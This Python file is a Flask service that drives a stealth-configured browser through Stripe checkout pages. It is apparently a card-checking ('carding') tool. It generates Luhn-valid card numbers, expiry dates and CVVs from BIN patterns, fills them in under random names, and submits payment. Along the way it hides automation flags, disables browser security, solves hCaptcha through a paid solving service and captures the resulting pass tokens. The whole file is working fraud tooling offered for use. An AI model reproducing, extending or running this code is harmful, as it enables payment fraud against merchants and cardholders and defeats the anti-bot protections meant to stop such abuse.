import os
import asyncio
import json
import random
import re
import time
import base64
from datetime import datetime
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout
from playwright._impl._errors import TargetClosedError
from flask import Flask, request, jsonify
from dotenv import load_dotenv
from collections import deque
import httpx
from urllib.parse import parse_qs

load_dotenv()

CONFIG = {
    "RUN_LOCAL": os.getenv('RUN_LOCAL', 'false').lower() == 'true',
    "BROWSERLESS_API_KEY": os.getenv('BROWSERLESS_API_KEY'),
    "TWOCAPTCHA_API_KEY": os.getenv('TWOCAPTCHA_API_KEY'),
    "RESPONSE_TIMEOUT_SECONDS": 30,  # Reduced for speed
    "RETRY_DELAY": 1000,  # Reduced for speed
    "RATE_LIMIT_REQUESTS": 10,  # Increased
    "RATE_LIMIT_WINDOW": 60,
    "MAX_RETRIES": 2,
    "BROWSERLESS_TIMEOUT": 60000,
    "CAPTCHA_TIMEOUT": 120,
    "FAST_MODE": True,  # Enable speed optimizations
    "LOG_REQUEST_BODIES": True  # Enable request body logging
}

app = Flask(__name__)
request_timestamps = deque(maxlen=CONFIG["RATE_LIMIT_REQUESTS"])

# Custom exception for token found
class CaptchaTokenFound(Exception):
    """Raised when captcha token is found"""
    pass

# 2Captcha solver class (unchanged)
class TwoCaptchaSolver:
    def __init__(self, api_key):
        self.api_key = api_key
        self.base_url = "http://2captcha.com"
        
    async def solve_hcaptcha(self, sitekey, page_url):
        """Solve HCaptcha using 2captcha service"""
        if not self.api_key:
            print("[CAPTCHA] No 2captcha API key configured")
            return None
            
        print(f"[CAPTCHA] Submitting HCaptcha to 2captcha...")
        
        try:
            async with httpx.AsyncClient() as client:
                submit_data = {
                    'key': self.api_key,
                    'method': 'hcaptcha',
                    'sitekey': sitekey,
                    'pageurl': page_url,
                    'json': 1
                }
                
                response = await client.post(f"{self.base_url}/in.php", data=submit_data)
                result = response.json()
                
                if result.get('status') != 1:
                    print(f"[CAPTCHA] Submit failed: {result.get('error_text', 'Unknown error')}")
                    return None
                
                captcha_id = result.get('request')
                print(f"[CAPTCHA] Task ID: {captcha_id}")
                
                start_time = time.time()
                while time.time() - start_time < CONFIG["CAPTCHA_TIMEOUT"]:
                    await asyncio.sleep(5)
                    
                    check_url = f"{self.base_url}/res.php?key={self.api_key}&action=get&id={captcha_id}&json=1"
                    response = await client.get(check_url)
                    result = response.json()
                    
                    if result.get('status') == 1:
                        token = result.get('request')
                        print(f"[CAPTCHA] ✓ Solved! Token: {token[:30]}...")
                        return token
                    elif result.get('request') == 'CAPCHA_NOT_READY':
                        elapsed = int(time.time() - start_time)
                        print(f"[CAPTCHA] Solving... ({elapsed}s)")
                        continue
                    else:
                        print(f"[CAPTCHA] Error: {result.get('error_text', 'Unknown')}")
                        return None
                
                print("[CAPTCHA] Timeout waiting for solution")
                return None
                
        except Exception as e:
            print(f"[CAPTCHA] Error: {e}")
            return None

# Enhanced captcha detection and handling
class CaptchaHandler:
    @staticmethod
    async def detect_hcaptcha(page):
        """Detect HCaptcha on the page"""
        try:
            hcaptcha_frame = await page.query_selector('iframe[src*="hcaptcha.com"]')
            if hcaptcha_frame:
                return True
                
            hcaptcha_div = await page.query_selector('div[data-hcaptcha-widget-id]')
            if hcaptcha_div:
                return True
                
            hcaptcha_element = await page.query_selector('.h-captcha')
            if hcaptcha_element:
                return True
                
            return False
            
        except Exception as e:
            return False
    
    @staticmethod
    async def get_hcaptcha_sitekey(page):
        """Extract HCaptcha sitekey from the page"""
        try:
            element = await page.query_selector('[data-sitekey]')
            if element:
                sitekey = await element.get_attribute('data-sitekey')
                if sitekey:
                    return sitekey
            
            iframe = await page.query_selector('iframe[src*="hcaptcha.com"]')
            if iframe:
                src = await iframe.get_attribute('src')
                match = re.search(r'sitekey=([a-zA-Z0-9-]+)', src)
                if match:
                    return match.group(1)
            
            scripts = await page.query_selector_all('script')
            for script in scripts:
                content = await script.inner_text()
                match = re.search(r'["\']sitekey["\']\s*:\s*["\']([a-zA-Z0-9-]+)["\']', content)
                if match:
                    return match.group(1)
                    
            return None
            
        except Exception as e:
            return None
    
    @staticmethod
    async def inject_captcha_token(page, token):
        """Inject the solved captcha token into the page"""
        try:
            await page.evaluate(f'''
                () => {{
                    const responseField = document.querySelector('[name="h-captcha-response"]');
                    if (responseField) {{
                        responseField.value = '{token}';
                        responseField.innerHTML = '{token}';
                    }}
                    
                    const gResponseField = document.querySelector('[name="g-recaptcha-response"]');
                    if (gResponseField) {{
                        gResponseField.value = '{token}';
                        gResponseField.innerHTML = '{token}';
                    }}
                    
                    if (typeof hcaptcha !== 'undefined' && hcaptcha.execute) {{
                        window.hcaptcha.execute();
                    }}
                    
                    if (window.hcaptchaCallback) {{
                        window.hcaptchaCallback('{token}');
                    }}
                    
                    if (window.onHcaptchaCallback) {{
                        window.onHcaptchaCallback('{token}');
                    }}
                }}
            ''')
            
            await page.evaluate(f'''
                () => {{
                    const event = new CustomEvent('hcaptcha-verified', {{
                        detail: {{ response: '{token}' }}
                    }});
                    document.dispatchEvent(event);
                }}
            ''')
            
            return True
            
        except Exception as e:
            return False

# Enhanced Universal Response Analyzer with Request Body Parsing
class UniversalResponseAnalyzer:
    def __init__(self, shared_state):
        self.shared_state = shared_state
        
    @staticmethod
    def parse_request_body(body_data, content_type):
        """Parse request body based on content type"""
        if not body_data:
            return None
            
        try:
            # JSON content
            if 'application/json' in content_type:
                return json.loads(body_data)
            
            # Form data
            elif 'application/x-www-form-urlencoded' in content_type:
                parsed = parse_qs(body_data)
                # Convert single-item lists to strings for readability
                return {k: v[0] if len(v) == 1 else v for k, v in parsed.items()}
            
            # Text or other
            else:
                return body_data[:1000] if len(body_data) > 1000 else body_data
                
        except Exception as e:
            return {"parse_error": str(e), "raw": body_data[:500] if body_data else ""}
    
    def analyze_request(self, url, method, headers, body_text, result_dict):
        """Analyze outgoing API request - for logging only"""
        if self.shared_state.captcha_token_found:
            return

        domain = url.split('/')[2] if '/' in url else url
        endpoint = url.split('?')[0] if '?' in url else url
        
        # Parse request body
        content_type = headers.get('content-type', '') if headers else ''
        parsed_body = self.parse_request_body(body_text, content_type)
        
        # Log important requests for debugging (not stored in result)
        is_payment_api = any(term in url.lower() for term in [
            'stripe', 'payment', 'checkout', 'charge', 'token', 
            'card', 'pay', 'billing', 'purchase', 'transaction', 'order'
        ])
        
        if CONFIG['LOG_REQUEST_BODIES'] and (is_payment_api or method in ['POST', 'PUT', 'PATCH']):
            print(f"[LOG-REQUEST-{method}] {domain} -> {endpoint[:50]}...")
            if parsed_body and isinstance(parsed_body, dict):
                for key in ['card', 'number', 'email', 'amount', 'currency', 'payment_method']:
                    if key in parsed_body:
                        print(f"  {key}: {str(parsed_body[key])[:50]}")
    
    def analyze_response(self, url, status, headers, body_text, result_dict):
        """Analyze incoming API response, prioritizing hCaptcha token detection"""
        
        domain = url.split('/')[2] if '/' in url else url
        endpoint = url.split('?')[0] if '?' in url else url
        
        # Try to parse as JSON first
        data = None
        content_type = "text"
        try:
            data = json.loads(body_text)
            content_type = "json"
        except:
            pass
        
        # --- CAPTCHA TOKEN EXTRACTION ---
        if data and 'hcaptcha.com' in domain.lower():
            if 'generated_pass_UUID' in data:
                self.shared_state.captcha_token = data['generated_pass_UUID']
                self.shared_state.captcha_token_found = True
                
                # Store ONLY the hCaptcha token response
                captcha_response = {
                    "type": "hcaptcha_token",
                    "url": url,
                    "timestamp": datetime.now().isoformat(),
                    "generated_pass_UUID": data['generated_pass_UUID'],
                    "full_response": data  # Store the full hCaptcha response
                }
                result_dict["hcaptcha_calls"].append(captcha_response)
                
                print(f"\n{'#'*80}")
                print("[CAPTCHA DETECTED] Generated Pass UUID Found!")
                print(f"TOKEN: {self.shared_state.captcha_token}")
                print(f"URL: {url}")
                print(f"{'#'*80}\n")
                
                # Raise custom exception to stop execution
                raise CaptchaTokenFound(self.shared_state.captcha_token)
            
        # If token already found, skip processing
        if self.shared_state.captcha_token_found:
            return

        # Log responses for debugging only (not stored in final result)
        is_payment_api = any(term in url.lower() for term in [
            'stripe', 'payment', 'checkout', 'charge', 'token', 
            'card', 'pay', 'billing', 'purchase', 'transaction'
        ])
        
        if is_payment_api or status >= 400:
            print(f"[LOG-RESPONSE-{status}] {domain} -> {endpoint[:50]}...")
            if content_type == "json" and data:
                # Log errors
                for field in ['error', 'error_message', 'message', 'decline_reason']:
                    if field in data and data[field]:
                        print(f"  {field}: {data[field]}")
                        result_dict["error"] = str(data[field])
                        result_dict["success"] = False
                        break

def rate_limit_check():
    now = time.time()
    while request_timestamps and request_timestamps[0] < now - CONFIG["RATE_LIMIT_WINDOW"]:
        request_timestamps.popleft()
    
    if len(request_timestamps) >= CONFIG["RATE_LIMIT_REQUESTS"]:
        oldest = request_timestamps[0]
        wait_time = CONFIG["RATE_LIMIT_WINDOW"] - (now - oldest)
        return False, wait_time
    
    request_timestamps.append(now)
    return True, 0

# Card utilities (unchanged)
def luhn_algorithm(number_str):
    total = 0
    reverse_digits = number_str[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if (i % 2) == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def complete_luhn(base):
    for d in range(10):
        candidate = base + str(d)
        if luhn_algorithm(candidate):
            return candidate
    return None

def get_card_length(bin_str):
    first_two = bin_str[:2] if len(bin_str) >= 2 else ""
    return 15 if first_two in ['34', '37'] else 16

def get_cvv_length(card_number):
    return 4 if len(card_number) == 15 else 3

def random_digit():
    return str(random.randint(0, 9))

def generate_card_from_pattern(pattern):
    clean_pattern = re.sub(r'[^0-9x]', '', pattern, flags=re.IGNORECASE)
    card_length = get_card_length(clean_pattern.replace('x', '0'))
    
    result = ''
    for char in clean_pattern:
        if len(result) >= card_length - 1:
            break
        result += random_digit() if char.lower() == 'x' else char
    
    while len(result) < card_length - 1:
        result += random_digit()
    
    result = result[:card_length - 1]
    return complete_luhn(result) or result + '0'

def process_card_with_placeholders(number, month, year, cvv):
    processed_number = generate_card_from_pattern(number) if 'x' in number.lower() else number
    processed_month = str(random.randint(1, 12)).zfill(2) if 'x' in month.lower() else month.zfill(2)
    
    current_year = datetime.now().year
    if 'x' in year.lower():
        processed_year = str(random.randint(current_year + 1, current_year + 6))
    elif len(year) == 2:
        processed_year = '20' + year
    else:
        processed_year = year
    
    cvv_length = get_cvv_length(processed_number)
    processed_cvv = ''.join([random_digit() for _ in range(cvv_length)]) if 'x' in cvv.lower() else cvv
    
    return {
        "number": processed_number,
        "month": processed_month,
        "year": processed_year,
        "cvv": processed_cvv
    }

def process_card_input(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        return None
    return process_card_with_placeholders(*parts)

def generate_random_name():
    first_names = ['Alex', 'Jordan', 'Taylor', 'Morgan', 'Casey', 'Riley', 'Avery', 'Quinn', 'Sage', 'Parker']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
    return f"{random.choice(first_names)} {random.choice(last_names)}"

async def safe_wait(page, ms):
    try:
        await page.wait_for_timeout(ms)
        return True
    except:
        return False

async def wait_for_network_idle(page, timeout=5000):
    """Wait for network to be idle"""
    try:
        await page.wait_for_load_state('networkidle', timeout=timeout)
        return True
    except:
        return False

# Shared state class
class ExecutionControl:
    def __init__(self):
        self.captcha_token_found = False
        self.captcha_token = None

async def run_stripe_automation(url, cc_string, email=None):
    card = process_card_input(cc_string)
    if not card:
        return {"error": "Invalid card format"}
    
    email = email or f"test{random.randint(1000,9999)}@example.com"
    random_name = generate_random_name()
    
    # Initialize shared state
    shared_state = ExecutionControl()
    
    print(f"\n{'='*80}")
    print(f"[START] {datetime.now().strftime('%H:%M:%S')}")
    print(f"[CARD] {card['number']} | {card['month']}/{card['year']} | {card['cvv']}")
    print(f"[EMAIL] {email}")
    print(f"[MODE] {'FAST' if CONFIG['FAST_MODE'] else 'NORMAL'} (Capture HCaptcha Token)")
    print('='*80)
    
    stripe_result = {
        "status": "pending",
        "hcaptcha_calls": [],  # Only store hCaptcha related calls
        "success": False,
        "error": None,
        "captcha_solved": False,
        "network_requests": 0,
        "network_errors": 0
    }
    
    analyzer = UniversalResponseAnalyzer(shared_state)
    captcha_handler = CaptchaHandler()
    captcha_solver = TwoCaptchaSolver(CONFIG.get("TWOCAPTCHA_API_KEY"))
    
    async with async_playwright() as p:
        browser = None
        context = None
        page = None
        payment_submitted = False
        
        try:
            # Browser setup
            browser_args = [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-blink-features=AutomationControlled',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process',
                '--allow-running-insecure-content',
                '--disable-popup-blocking',
                '--disable-content-security-policy'
            ]
            
            if CONFIG["RUN_LOCAL"]:
                browser = await p.chromium.launch(
                    headless=False, 
                    slow_mo=50 if CONFIG['FAST_MODE'] else 100,
                    args=browser_args
                )
            else:
                browser_url = f"wss://production-sfo.browserless.io/chromium/playwright?token={CONFIG['BROWSERLESS_API_KEY']}&timeout={CONFIG['BROWSERLESS_TIMEOUT']}"
                try:
                    browser = await p.chromium.connect(browser_url, timeout=30000)
                except Exception as e:
                    browser = await p.chromium.launch(headless=True, args=browser_args)
            
            # Create context
            context = await browser.new_context(
                viewport={'width': 1920, 'height': 1080},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                locale='en-US',
                timezone_id='America/New_York',
                ignore_https_errors=True,
                bypass_csp=True,
                java_script_enabled=True,
                permissions=['geolocation', 'notifications', 'camera', 'microphone'],
                extra_http_headers={
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate, br'
                }
            )
            
            # Add stealth scripts
            await context.add_init_script("""
                // Remove webdriver flag
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => false,
                });
                
                // Add plugins
                Object.defineProperty(navigator, 'plugins', {
                    get: () => [1, 2, 3, 4, 5],
                });
                
                // Chrome specific
                window.chrome = {
                    runtime: {},
                    loadTimes: function() {},
                    csi: function() {},
                    app: {}
                };
                
                // Permission overrides
                const originalQuery = window.navigator.permissions.query;
                window.navigator.permissions.query = (parameters) => (
                    parameters.name === 'notifications' ?
                        Promise.resolve({ state: Notification.permission }) :
                        originalQuery(parameters)
                );
            """)
            
            page = await context.new_page()
            
            # Network interception handlers
            async def capture_request(request):
                if shared_state.captcha_token_found:
                    return
                try:
                    stripe_result["network_requests"] += 1
                    url = request.url
                    method = request.method
                    headers = request.headers
                    
                    body_text = None
                    try:
                        if method in ['POST', 'PUT', 'PATCH']:
                            body = request.post_data
                            if body:
                                body_text = body
                                analyzer.analyze_request(url, method, headers, body_text, stripe_result)
                    except:
                        pass
                except Exception as e:
                    pass
            
            async def capture_response(response):
                if shared_state.captcha_token_found:
                    return
                try:
                    url = response.url
                    status = response.status
                    headers = response.headers
                    
                    try:
                        body = await response.body()
                        text = body.decode('utf-8', errors='ignore') if body else ""
                        
                        # This will raise CaptchaTokenFound if token is found
                        analyzer.analyze_response(url, status, headers, text, stripe_result)
                        
                    except CaptchaTokenFound:
                        # Token found, stop processing
                        return
                    except Exception as e:
                        # Log error but don't store in result
                        print(f"[LOG-ERROR] Response processing: {str(e)[:50]}")
                        
                except CaptchaTokenFound:
                    return
                except Exception as e:
                    stripe_result["network_errors"] += 1
            
            async def capture_request_failed(request):
                if shared_state.captcha_token_found:
                    return
                stripe_result["network_errors"] += 1
                print(f"[LOG-FAILED] {request.url[:50]}...")
            
            # Attach handlers
            page.on("request", capture_request)
            page.on("response", capture_response)
            page.on("requestfailed", capture_request_failed)
            
            # Route interception
            await page.route('**/*', lambda route, request: route.continue_())
            
            # Console logging
            page.on("console", lambda msg: None)
            page.on("pageerror", lambda error: None)
            
            try:
                # Navigate to page
                print("[NAV] Loading page...")
                await page.goto(url, wait_until="networkidle", timeout=40000)
                print("[NAV] ✓ Page loaded")
                
                # Wait for dynamic content
                await wait_for_network_idle(page, 5000)
                
                # Wait for lazy-loaded content
                await safe_wait(page, 2000 if CONFIG['FAST_MODE'] else 3000)
                
                # Check for HCaptcha
                has_captcha = await captcha_handler.detect_hcaptcha(page)
                if has_captcha:
                    print("[CAPTCHA] HCaptcha detected on page")
                    sitekey = await captcha_handler.get_hcaptcha_sitekey(page)
                    
                    if sitekey and CONFIG.get("TWOCAPTCHA_API_KEY"):
                        print(f"[CAPTCHA] Sitekey found: {sitekey}")
                        token = await captcha_solver.solve_hcaptcha(sitekey, page.url)
                        
                        if token:
                            await captcha_handler.inject_captcha_token(page, token)
                            stripe_result["captcha_solved"] = True
                            await safe_wait(page, 1000 if CONFIG['FAST_MODE'] else 2000)
                
                # Check if token was found
                if shared_state.captcha_token_found:
                    print(f"\n[FINAL RESULT] CAPTCHA Token Successfully Captured!")
                    return {
                        "success": True,
                        "action": "CAPTCHA_TOKEN_CAPTURED",
                        "generated_pass_UUID": shared_state.captcha_token,
                        "hcaptcha_data": stripe_result['hcaptcha_calls'],  # Only hCaptcha data
                        "network_stats": {
                            "total_requests": stripe_result['network_requests'],
                            "errors": stripe_result['network_errors']
                        }
                    }
                
                # Continue with normal flow if no token found yet...
                # Fill email
                email_filled = False
                email_selectors = [
                    'input[type="email"]',
                    'input[name="email"]',
                    '#email',
                    'input[placeholder*="email" i]',
                    'input[id*="email" i]',
                    'input[autocomplete="email"]'
                ]
                
                for selector in email_selectors:
                    if email_filled or shared_state.captcha_token_found:
                        break
                    try:
                        elements = await page.query_selector_all(selector)
                        for element in elements:
                            if await element.is_visible():
                                await element.scroll_into_view_if_needed()
                                await element.click()
                                await element.fill("")
                                await element.type(email, delay=20 if CONFIG['FAST_MODE'] else 50)
                                email_filled = True
                                print(f"[FORM] Email filled: {email}")
                                break
                    except:
                        continue
                
                await safe_wait(page, 500 if CONFIG['FAST_MODE'] else 1500)
                
                # Fill card details
                print("[FORM] Filling card details...")
                filled_status = {"card": False, "expiry": False, "cvc": False, "name": False}
                
                # Fill name
                try:
                    name_selectors = [
                        'input[name*="name" i]:not([name*="email"])',
                        'input[placeholder*="name" i]:not([placeholder*="email"])',
                        '#cardholder-name',
                        'input[autocomplete*="name"]'
                    ]
                    for selector in name_selectors:
                        if filled_status["name"] or shared_state.captcha_token_found:
                            break
                        elements = await page.query_selector_all(selector)
                        for element in elements:
                            if await element.is_visible():
                                await element.click()
                                await element.fill(random_name)
                                filled_status["name"] = True
                                print(f"[FORM] Name filled: {random_name}")
                                break
                except:
                    pass
                
                # Get all frames
                all_frames = []
                def collect_frames(frame):
                    all_frames.append(frame)
                    for child in frame.child_frames:
                        collect_frames(child)
                
                collect_frames(page.main_frame)
                stripe_frames = [f for f in all_frames if 'stripe' in f.url.lower() or 'checkout' in f.url.lower()]
                
                # Fill card details
                for attempt in range(2):
                    if all([filled_status["card"], filled_status["expiry"], filled_status["cvc"]]) or shared_state.captcha_token_found:
                        break
                    
                    frames_to_check = [page] + stripe_frames
                    
                    for frame_or_page in frames_to_check:
                        if shared_state.captcha_token_found:
                            break
                        try:
                            # Card number
                            if not filled_status["card"]:
                                card_selectors = [
                                    'input[placeholder*="1234" i]',
                                    'input[placeholder*="card" i]',
                                    'input[name*="card" i]',
                                    'input[autocomplete="cc-number"]',
                                    'input[data-elements-stable-field-name="cardNumber"]',
                                    '#cardNumber'
                                ]
                                for selector in card_selectors:
                                    try:
                                        element = await frame_or_page.query_selector(selector)
                                        if element and await element.is_visible():
                                            await element.scroll_into_view_if_needed()
                                            await element.click()
                                            await element.fill("")
                                            typing_delay = 20 if CONFIG['FAST_MODE'] else random.randint(30, 80)
                                            for digit in card['number']:
                                                await element.type(digit, delay=typing_delay)
                                            filled_status["card"] = True
                                            print(f"[FORM] Card number filled")
                                            break
                                    except:
                                        continue
                            
                            # Expiry
                            if not filled_status["expiry"]:
                                expiry_selectors = [
                                    'input[placeholder*="mm" i]',
                                    'input[placeholder*="exp" i]',
                                    'input[name*="exp" i]',
                                    'input[autocomplete="cc-exp"]',
                                    'input[data-elements-stable-field-name="cardExpiry"]',
                                    '#cardExpiry'
                                ]
                                for selector in expiry_selectors:
                                    try:
                                        element = await frame_or_page.query_selector(selector)
                                        if element and await element.is_visible():
                                            await element.scroll_into_view_if_needed()
                                            await element.click()
                                            await element.fill("")
                                            exp_string = f"{card['month']}/{card['year'][-2:]}"
                                            typing_delay = 20 if CONFIG['FAST_MODE'] else random.randint(30, 80)
                                            for char in exp_string:
                                                await element.type(char, delay=typing_delay)
                                            filled_status["expiry"] = True
                                            print(f"[FORM] Expiry filled")
                                            break
                                    except:
                                        continue
                            
                            # CVC
                            if not filled_status["cvc"]:
                                cvc_selectors = [
                                    'input[placeholder*="cvc" i]',
                                    'input[placeholder*="cvv" i]',
                                    'input[placeholder*="security" i]',
                                    'input[name*="cvc" i]',
                                    'input[name*="cvv" i]',
                                    'input[autocomplete="cc-csc"]',
                                    'input[data-elements-stable-field-name="cardCvc"]',
                                    '#cardCvc'
                                ]
                                for selector in cvc_selectors:
                                    try:
                                        element = await frame_or_page.query_selector(selector)
                                        if element and await element.is_visible():
                                            await element.scroll_into_view_if_needed()
                                            await element.click()
                                            await element.fill("")
                                            typing_delay = 20 if CONFIG['FAST_MODE'] else random.randint(30, 80)
                                            for digit in card['cvv']:
                                                await element.type(digit, delay=typing_delay)
                                            filled_status["cvc"] = True
                                            print(f"[FORM] CVC filled")
                                            break
                                    except:
                                        continue
                        except Exception as e:
                            continue
                    
                    if not all([filled_status["card"], filled_status["expiry"], filled_status["cvc"]]):
                        await safe_wait(page, 500 if CONFIG['FAST_MODE'] else 1000)
                
                print(f"[FORM] Status: Card={filled_status['card']}, Exp={filled_status['expiry']}, CVC={filled_status['cvc']}")
                
                # Wait for validation
                await safe_wait(page, 1500 if CONFIG['FAST_MODE'] else 3000)
                await wait_for_network_idle(page, 3000)
                
                # Check for captcha again
                has_captcha_after = await captcha_handler.detect_hcaptcha(page)
                if has_captcha_after and not stripe_result["captcha_solved"]:
                    sitekey = await captcha_handler.get_hcaptcha_sitekey(page)
                    
                    if sitekey and CONFIG.get("TWOCAPTCHA_API_KEY"):
                        token = await captcha_solver.solve_hcaptcha(sitekey, page.url)
                        if token:
                            await captcha_handler.inject_captcha_token(page, token)
                            stripe_result["captcha_solved"] = True
                            await safe_wait(page, 1000)
                
                # Check if token was found
                if shared_state.captcha_token_found:
                    print(f"\n[FINAL RESULT] CAPTCHA Token Successfully Captured!")
                    return {
                        "success": True,
                        "action": "CAPTCHA_TOKEN_CAPTURED",
                        "generated_pass_UUID": shared_state.captcha_token,
                        "hcaptcha_data": stripe_result['hcaptcha_calls'],  # Only hCaptcha data
                        "network_stats": {
                            "total_requests": stripe_result['network_requests'],
                            "errors": stripe_result['network_errors']
                        }
                    }
                
                # Submit payment
                print("[SUBMIT] Looking for submit button...")
                submit_selectors = [
                    'button[type="submit"]:visible',
                    'button:has-text("pay"):visible',
                    'button:has-text("submit"):visible',
                    'button:has-text("complete"):visible',
                    'button:has-text("confirm"):visible',
                    'button:has-text("place order"):visible',
                    'button:has-text("checkout"):visible',
                    'button.btn-primary:visible',
                    'button.submit-button:visible',
                    'input[type="submit"]:visible'
                ]
                
                for selector in submit_selectors:
                    if shared_state.captcha_token_found:
                        break
                    try:
                        btn = page.locator(selector).first
                        if await btn.count() > 0:
                            is_disabled = await btn.get_attribute('disabled')
                            if is_disabled is None or is_disabled == 'false':
                                await btn.scroll_into_view_if_needed()
                                await btn.click()
                                payment_submitted = True
                                print(f"[SUBMIT] ✓ Clicked button")
                                break
                    except:
                        continue
                
                if not payment_submitted and not shared_state.captcha_token_found:
                    await page.keyboard.press('Enter')
                    payment_submitted = True
                    print("[SUBMIT] ✓ Enter key pressed")
                
                # Wait for payment processing
                print(f"[WAIT] Processing payment...")
                await safe_wait(page, 10000 if CONFIG['FAST_MODE'] else 15000)
                await wait_for_network_idle(page, 5000)
                
                # Monitor for response
                start_time = time.time()
                max_wait = CONFIG["RESPONSE_TIMEOUT_SECONDS"]
                
                while time.time() - start_time < max_wait and not shared_state.captcha_token_found:
                    # Keep alive
                    if int(time.time() - start_time) % 5 == 0 and int(time.time() - start_time) > 0:
                        try:
                            await page.evaluate('1')
                        except:
                            break
                    
                    await asyncio.sleep(0.5)

            except CaptchaTokenFound:
                pass  # Token was found, exit gracefully

            # Final output generation
            if shared_state.captcha_token_found:
                print(f"\n[FINAL RESULT] CAPTCHA Token Successfully Captured!")
                print(f"Token: {shared_state.captcha_token}")
                return {
                    "success": True,
                    "action": "CAPTCHA_TOKEN_CAPTURED",
                    "generated_pass_UUID": shared_state.captcha_token,
                    "hcaptcha_data": stripe_result['hcaptcha_calls'],  # Only hCaptcha data
                    "network_stats": {
                        "total_requests": stripe_result['network_requests'],
                        "errors": stripe_result['network_errors']
                    }
                }
            
            # No token found
            print("[RESULT] No HCaptcha token found in responses")
            return {
                "success": False,
                "message": "Process complete, no HCaptcha token found",
                "error": stripe_result.get("error", "No HCaptcha token detected in API responses"),
                "captcha_solved": stripe_result.get("captcha_solved"),
                "network_stats": {
                    "total_requests": stripe_result['network_requests'],
                    "errors": stripe_result['network_errors']
                }
            }
                
        except Exception as e:
            print(f"[ERROR] {str(e)}")
            
            # Check for token again
            if shared_state.captcha_token_found:
                return {
                    "success": True,
                    "action": "CAPTCHA_TOKEN_CAPTURED",
                    "generated_pass_UUID": shared_state.captcha_token,
                    "hcaptcha_data": stripe_result['hcaptcha_calls'],  # Only hCaptcha data
                    "network_stats": {
                        "total_requests": stripe_result['network_requests'],
                        "errors": stripe_result['network_errors']
                    }
                }
            
            return {
                "success": False,
                "error": f"Automation failed: {str(e)}",
                "captcha_solved": stripe_result.get("captcha_solved", False),
                "network_stats": {
                    "total_requests": stripe_result.get('network_requests', 0),
                    "errors": stripe_result.get('network_errors', 0)
                }
            }
            
        finally:
            try:
                if page:
                    await page.close()
                if context:
                    await context.close()
                if browser:
                    await browser.close()
                print("[CLEANUP] ✓")
            except:
                pass

@app.route('/hrkXstripe', methods=['GET'])
def stripe_endpoint():
    can_proceed, wait_time = rate_limit_check()
    if not can_proceed:
        return jsonify({"error": "Rate limit exceeded", "retry_after": f"{wait_time:.1f}s"}), 429
    
    url = request.args.get('url')
    cc = request.args.get('cc')
    email = request.args.get('email')
    
    print(f"\n{'='*80}")
    print(f"[REQUEST] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[URL] {url[:100]}...")
    print(f"[CC] {cc}")
    print('='*80)
    
    if not url or not cc:
        return jsonify({"error": "Missing parameters: url and cc"}), 400
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        result = loop.run_until_complete(run_stripe_automation(url, cc, email))
        
        if result.get('action') == 'CAPTCHA_TOKEN_CAPTURED':
            print(f"\n[SUCCESS] CAPTCHA Token Captured!")
            print(f"Generated Token: {result['generated_pass_UUID']}")
        else:
            print(f"[RESULT] {'✓ SUCCESS' if result.get('success') else '✗ FAILED'}")
            
        return jsonify(result), 200 if result.get('success') else 400
        
    except Exception as e:
        print(f"[SERVER ERROR] {e}")
        return jsonify({"error": str(e)}), 500
    finally:
        loop.close()

@app.route('/status', methods=['GET'])
def status_endpoint():
    return jsonify({
        "status": "online",
        "version": "5.2-hcaptcha-only",
        "features": {
            "hcaptcha_token_capture": True,
            "2captcha": bool(CONFIG.get("TWOCAPTCHA_API_KEY")),
            "fast_mode": CONFIG.get("FAST_MODE", False),
            "response_filtering": "hcaptcha_only"
        },
        "timestamp": datetime.now().isoformat()
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5001))
    print("="*80)
    print("[SERVER] Stripe Automation v5.2 - HCaptcha Token Capture Only")
    print(f"[PORT] {port}")
    print(f"[2CAPTCHA] {'Enabled' if CONFIG.get('TWOCAPTCHA_API_KEY') else 'Disabled'}")
    print(f"[MODE] {'FAST' if CONFIG.get('FAST_MODE') else 'NORMAL'}")
    print("[OUTPUT] Only HCaptcha tokens in API response")
    print("[LOGGING] All other API calls logged to console only")
    print("="*80)
    app.run(host='0.0.0.0', port=port, debug=False)
